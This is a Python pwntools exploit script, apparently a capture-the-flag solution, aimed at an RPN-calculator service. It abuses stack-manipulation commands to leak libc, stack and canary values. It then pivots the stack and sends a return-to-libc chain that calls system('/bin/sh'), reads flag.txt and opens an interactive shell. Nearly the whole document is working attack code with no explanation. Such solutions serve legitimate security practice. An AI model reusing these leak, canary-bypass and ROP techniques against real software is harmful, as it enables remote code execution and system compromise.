#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 11342
HOST = "0.cloud.chals.io"
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.27.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            # push
            # brva 0x0000000000000A39
            # rot
            # brva 0x0000000000000D82
            # popv
            # brva 0x0000000000000A60
            # brva 0x0000000000000C13
            # leave; ret
            brva 0x0000000000000EBF
            brva 0x0000000000000EC4
            # dup
            # brva 0x0000000000000E62
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE


# PAYLOAD

# Leak libc
payload = b''
for i in range(13):
    payload += f'push {i + 1} '.encode()
payload += b' rot pop'
p.sendlineafter(b'RPN> ', payload)
libc_leak_part1 = int(p.recvuntil(b'\n', drop=True), 10) & 0xffffffff

payload = b''
for i in range(18):
    payload += f'push {i + 1} '.encode()
payload += b' rot pop'
p.sendlineafter(b'RPN> ', payload)
libc_leak_part2 = int(p.recvuntil(b'\n', drop=True), 10) & 0xffff
libc_leak = libc_leak_part2 * 0x100000000 + libc_leak_part1
libc.address = libc_leak - libc.sym.printf - 166
log.info("Libc base: " + hex(libc.address))
pop_rdi = 0x000000000002164f + libc.address
ret = pop_rdi + 1
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym.system
gadget = [0x4f29e, 0x4f2a5, 0x4f302, 0x10a2fc]


# Leak stack
payload = b''
for i in range(5):
    payload += f'push {i + 1} '.encode()
payload += b' rot pop'
p.sendlineafter(b'RPN> ', payload)
stack_leak_part1 = int(p.recvuntil(b'\n', drop=True), 10) & 0xffffffff

payload = b''
for i in range(6):
    payload += f'push {i + 1} '.encode()
payload += b' rot pop'
p.sendlineafter(b'RPN> ', payload)
stack_leak_part2 = int(p.recvuntil(b'\n', drop=True), 10) & 0xffff
stack_leak = stack_leak_part2 * 0x100000000 + stack_leak_part1
log.info("Stack leak: " + hex(stack_leak))
target = stack_leak - 0x248


# Leak canary
payload = b''
for i in range(33):
    payload += f'push {i + 1} '.encode()
for i in range(32):
    payload += f'push {i + 1} '.encode()
payload += b' rot rot dup pop rot rot dup pop'
p.sendlineafter(b'RPN> ', payload)
canary_part1 = int(p.recvuntil(b'\n', drop=True), 10) & 0xffffffff
canary_part2 = int(p.recvuntil(b'\n', drop=True), 10) & 0xffffffff
canary = canary_part1 * 0x100000000 + canary_part2
log.info("Canary: " + hex(canary))


# Stack pivot
payload = b''
for i in range(63):
    payload += f'push {i + 1} '.encode()
payload += f' push {0x1234} push {0x2345} push {target & 0xffffffff} '.encode()
payload += f'rot pop pop push {canary_part2} rot rot'.encode()
print(payload)
GDB()
p.sendlineafter(b'RPN> ', payload)

payload = flat(
    pop_rdi,
    bin_sh,
    ret,
    system
    )
p.sendlineafter(b'RPN> ', payload)
p.sendline(b'cat flag.txt')

p.interactive()